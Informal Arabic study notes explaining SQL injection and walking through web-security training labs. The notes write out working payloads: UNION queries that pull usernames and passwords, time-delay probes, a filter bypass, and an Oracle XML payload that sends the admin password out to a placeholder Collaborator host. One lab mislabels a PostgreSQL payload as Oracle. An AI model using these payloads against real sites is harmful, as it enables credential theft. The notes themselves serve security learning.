بسم الله الرحمن الرحيم :- 


1-  إيه هي قواعد البيانات (Database)؟  
     هي مكان بنخزن فيه البيانات بشكل منظم بحيث نقدر نضيف ونعدل ونبحث ونحذف بسهولة.   
     اول حاجه هنتكلم فيها اهم الاوامر 
         ا-   UNION  =- بيستخدم لدمج نتائج **استعلامين SELECT** في نتيجة واحدة. 
         ب- SELECT = > هو امر قرائه البيانات 
         ج- FROM =>  بيحدد الجدول 
         د- information_schema  => دي قاعدة بيانات خاصة موجودة في MySQL. مفهاش بيانات المستخدمين لكن فى معلومات عن قواعد البيانات شكل اسماء الجداول اسماء الاعمده   
         و - WHERE => شرط لتصفية النتائج.  بتفلتر الصفوف **قبل التجميع**. 
         ر- HAVING =>  استخدام شكل where لاكن ده بتفلتر النتائج **بعد التجميع**. 
         ف- LIKE => للبحث عن نصوص.   % 
         ق - Comments => المهاجم يستخدم التعليقات لإلغاء باقي الاستعلام. 
         س- version() => تعرف اصدار قاعده البيانات 
         ش- database() => تعرف اسم قاعده البيانات 

2-   ما هي SQL Injection؟
     -هي ثغرة أمنية بتحصل لما التطبيق يسمح للمستخدم بإدخال بيانات تدخل مباشرة داخل استعلام SQL بدون حماية أو فلترة.  والفكره هنا ان التطبيق بيبعت استعلام لقاعدة البيانات، والمهاجم يضيف جزء جديد للاستعلام.       
     1. ليه بتحصل SQL Injection؟ 
         لأن المبرمج بيبني الاستعلام عن طريق **دمج (Concatenate)** مدخلات المستخدم مع نص الاستعلام.
     2.  التطبيق بيبقى Vulnerable إزاي؟ 
         لأنه **بيثق في مدخلات المستخدم**. وبيعتبرها بيانات عاديه جزء من Sql   يعني قاعدة البيانات مش بتفرق بين:
         - البيانات اللي المستخدم كتبها.
         - أوامر SQL اللي المستخدم حقنها.
         وده سبب الثغرة.
     3)  ماذا يستطيع المهاجم أن يفعل؟
         إذا كانت الثغرة موجودة، قد يستطيع:
         - قراءة بيانات المستخدمين.
        - قراءة كلمات المرور (إذا كانت مخزنة بطريقة غير آمنة).
        - معرفة أسماء الجداول والأعمدة.
        - تجاوز تسجيل الدخول في بعض التطبيقات الضعيفة.
        - تعديل أو حذف البيانات إذا كانت صلاحيات قاعدة البيانات تسمح بذلك.

3-  أنواع SQL Injection  
	 1. SQLi in WHERE Clause 
	    الفكره هنا الثغرة موجودة داخل **شرط WHERE**  = يعنى مثلا انتا كتبت فى اللوجن حاجه تعرف تكتب الامر الخبيث بتاعك بعده وتعمل كومنت للباقى  شكل كدا Phones' OR '1'='1  
	 2. SQLi in Login  
         ده اشهر نوع انتا لما بتيجى تعمل login طبعا بتحتاج user and pass  انتا ممكن تكتب اليوزر وبعده تعمل كومنت لل pass  وده ثغره خطيره جداااااا 
     3.  UNION-based SQLi 
         ده نوع مشهور يعنى مثلا عاوز برودجت معين تمم بدل ما ارجع حاجات من الموقع ارجع معلومات من جدول اخر شكل ' UNION SELECT username,password FROM users-- 
     4. Error-based SQLi  
        هنا الفكره بدل ما استخرج البيانات مباشرا اجبر الموقع انه يطلع ايررورر 
     5.  Blind SQL Injection 
         ده اصعب نوع الموقع مش بيعرض داتا ولا بيطلع ايررور وده ليه نوعين 
            A) Boolean-based Blind SQLi 
                نسأل قاعدة البيانات سؤال. ونشوف مره يبقا صح ومره غلط ونعرف سلوك الموقع 
             B) Time-based Blind SQLi 
                 هنا بنستغل الزمن  لو الشرط صحيح انتظر خمس ثوانى اذا لا ابعت دلوقتى  
     6. Out-of-band SQLi
         وده أقل نوع هتقابله.  بدل ما الموقع يرجع البيانات...
         قاعدة البيانات نفسها ترسلها للخارج. مثلا DNS - HTTPS  
         ## يستخدم عندما
        - لا يوجد Error
         - لا يوجد Output
        - لا يوجد Boolean
         - لا يوجد Time
 
4-   اكتشاف ثغرة SQL Injection 
     ## الفكرة الأساسية
    لما تلاقي أي Input في الموقع مثل:
    - Search
    - Login
    - Filter
    - URL Parameter
    - Cookie
    - Header
     ولما تشوف ده تسال نفسك هل ده بيدخل فى SQL لو اه تبدا تدور هل فيه ثغره ولا ايه 
     اول حاجه استخدام ( ' ) (Single Quote)  ولو الموقع فيه ثغره هيظهر Syntax Error 
     ثانيًا: استخدام `"` (Double Quote)  لو ظهر Error مشابه يبقى فيه احتمال كبير لوجود SQLi.
     ثالثًا: استخدام (  `--`  #   /** / ) ده بيعمل كومنت لكل ال بعده وده بيساعدنا نشوف الثغره هنا ان ممكن تلغى الجزء ال بعده  

5-استغلال الثغرة (SQL Injection Exploitation) 
     الفكرة العامة
     بعد اكتشاف SQL Injection، لا تبدأ مباشرة بمحاولة استخراج البيانات
    اكتشاف الثغرة
       ↓
    معرفة عدد الأعمدة
     ↓
    معرفة نوع البيانات في الأعمدة
     ↓
     معرفة أسماء الجداول
    ↓
     معرفة أسماء الأعمدة
    ↓
    استخراج البيانات    
     1. معرفة عدد الأعمدة 
         لأن `UNION` لا يعمل إلا إذا كان عدد الأعمدة في الاستعلامين متساويًا. لو استخدمت وعدد العمدان مش متساوى هيظهر خطا 
         ## طريقتان لمعرفة عدد الأعمدة 
             أ) ORDER BY 
                 ب`ORDER BY 1` يعني رتب حسب العمود الأول وهتنيك تزود فى الارقام لحد ما تعرف عدد العمدان 
             ب) UNION SELECT NULL 
                 تجرب عددًا مختلفًا من قيم `NULL` لأن `NULL` يتوافق غالبًا مع معظم أنواع البيانات. 
                  ب UNION SELECT NULL,NULL وتنيك تشوف لحد ما تعرف عدد العمدان 
     2. معرفة نوع البيانات 
         حتى تعرف أي الأعمدة يمكن أن تعرض نصوصًا، وأيها أرقام.
     3. استخراج أسماء الجداول 
         بعد نجاح `UNION`، تحتاج إلى معرفة أسماء الجداول الموجودة في قاعدة البيانات. 
     4. استخراج أسماء الأعمدة 
         بعد معرفة اسم الجدول، تبحث عن الأعمدة الموجودة داخله. 
     5. استخراج البيانات 
         بعد معرفة:
        - اسم الجدول.
        - أسماء الأعمدة.
        يمكن قراءة البيانات الموجودة داخله.
     6. تجاوز صفحة Login 
         تغيير منطق التحقق في التطبيقات الضعيفة 

6- لابات 
     3- # Lab: SQL injection attack, querying the database type and version on Oracle 
         الفكره هنا ان انتا عاوز تجيب كل البورردجت 
    4- # Lab: SQL injection attack, querying the database type and version on MySQL and    
         عاوز تجيب نسخه الداتا بيز 
    5- # Lab: SQL injection attack, listing the database contents on non-Oracle databases 
        الفكره هنا انتا هتشوف ال union بيشيل كام اسم وبعدين ال tables  ال موجوده شكل كدا 1. `'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`  
         وبعد ما تشوف الجداول تشوف الجدول ال اوله user  علشان ده ال فيه البيانات وبعدين تستخده ده 1. `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--`    وهتشوف الباسورد واليوزر نيم مسميهم ايه وابعدين تجبهم ب ده '+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef-- 
    6-   # Lab: SQL injection attack, listing the database contents on Oracle  
         الفكره هنا عن ال لاب ال الفات كفيش information_schema    
          '+UNION+SELECT+'abc','def'+FROM+dual--  
          '+UNION+SELECT+table_name,NULL+FROM+all_tables-- 
            +UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name
        ='USERS_ABCDEF'--   
               '+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD
               _ABCDEF+FROM+USERS_ABCDEF--
     7- # Lab: SQL injection UNION attack, determining the number of columns returned by the query 
    7- # Lab: SQL injection UNION attack, determining the number of columns returned by the query
         الفكره هنا انتا عاوز تعرف غيه كام عمود فى الطلب '+UNION+SELECT+NULL,NULL,NULL-- 
    8- # Lab: SQL injection UNION attack, finding a column containing text
         الفكره هنا عاوز تشوف عدد الاعمده ال فى ال UNION واى واحد فيهم بيعرض STRING 
    9-# Lab: SQL injection UNION attack, retrieving data from other tables
         هو هنا عاوز اليوزر نيم والباسورد نفس فكره الاب الخامس 
    10-# Lab: SQL injection UNION attack, retrieving multiple values in a single column
         هنا هنشتغل الشغل ال فات بس الفرق هنا ان username and password  بيتعرضوا فى خانه
          1. `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`
    11-# Lab: Blind SQL injection with conditional responses
          الفكره هنا ان لاب ده مش بيعرض النتايج علطول انتا بتستخرجها واحده واحده من سلوك الصفه 
          وبترجع صح او غلط وهتستخدم ال AND  وتشوف سلوك الصفحه يعنى نبده ب 1=1 ونشوف وهكذا وتبدا تشوف قواعد البيانات اسمها ايه وبعدين هيبقا مديك يوزر نيم هتشوف الباسوره طوله كام وبعدين تعمل برود فورس اتاك عليه 
    12- # Lab: Blind SQL injection with conditional errors
         نفس فكره الاب ال فات بس الاختلاف فى نوع قاعده البيانات هنانوعها Oracle 
    13- # Lab: Visible error-based SQL injection
          الاب ده الفكره فيه الطلب ال عاوزه بتنفذ بيظهر فى الايررور بس هنا نوع قاعده البيانات SQL Server   فهتستخدم ده  (AS  int(lلكود ال عاوز تنفذه )) AND 1=CAST   والناتج هيطلع فى الايررو وهنا برده ساعات يقولك المساحه بمش كافيه فتشيل ال Tracking  id  
    14- # Lab: Blind SQL injection with time delays 
         وهنا نوع الثغره مش بتدى ايررور بس فيها time delay  ونوع ثاعده البانات Oracle   فهتسخدم ده 
         ||pg_sleep(10)
    15-# Lab: Blind SQL injection with time delays and information retrieval 
         الفكره هنا ان الصفحه فيها time delay  وهو مدينى ان فيه table name users and colomes password and username  وهنا الاول هتتاكد من اسم الجدول وبعدين تشوف اليوزرا ال وتشوف طول كلمه السر بتاعته وبعدين تعمل عليها attake  
         (     TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--     )  
         وهتيجى فى ال )(1=1 ) هتحط الشرط ال انتا عاوزه يتحقق
    16- # Lab: Blind SQL injection with out-of-band interaction
        الفكره هنا بقا مش بيظهر المحتوى فى الصفحه ولا فى الايررور ولا فى تاخير الوقت هنا انتا الفكره 
        بدل ما الموقع يقول لي "الـ Payload اشتغل"، أجعل **قاعدة البيانات نفسها تتصل بجهازي** (عن طريق Burp Collaborator). إذا وصلني الاتصال، أعرف أن الـ Payload نُفذ. 
        استغلال SQL Injection لإجبار Oracle على تحليل XML يحتوي على External Entity، مما يؤدي إلى إرسال طلب إلى Burp Collaborator لإثبات نجاح الحقن.
    17-# Lab: Blind SQL injection with out-of-band data exfiltration
         الاب ده نفس فكره الاب ال فات بس هنا هنكمل وهنبقا عاوزين كلمه سر admin  وطبعا لازم تعمل شكل ال فات وهنستخدم ده 
         TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
    18-# Lab: SQL injection with filter bypass via XML encoding
         ### الفكرة
        - التطبيق يستقبل البيانات بصيغة **XML**.
        - يوجد **SQL Injection** فى أحد عناصر الـ XML.
          - التطبيق يمنع كلمات مثل:
        - UNION
        - SELECT
        - FROM
        - يمكن تجاوز الفلترة باستخدام **XML Entity Encoding**.
         والحل هتفتح فى الصفحه منتج وتشوف هتلاقى قى الاخر كلمه تضغط عليها وتستقبل الطلب فى البيرب وتروح تحت فى  <storeId>  وتكتب جنب اسم المنتج ال انتا عاوزه وبعدين تعمل سليكت عليه و توديه hakervertor  وبعدين encode وبعدين hex_entities  كدا يتحول ويسمح انك تعدى وتكتب الكود ال انتا عاوزه فى النص وبس كدا وطبعا ده ال UNION SELECT username || '~' || password FROM users    وهيديك كل اليوزر والباس وتسجل دخول انتا بقا براحتك



 
 
 
 والحمد لله حمدا كثيرا طيبا مباركا فيه 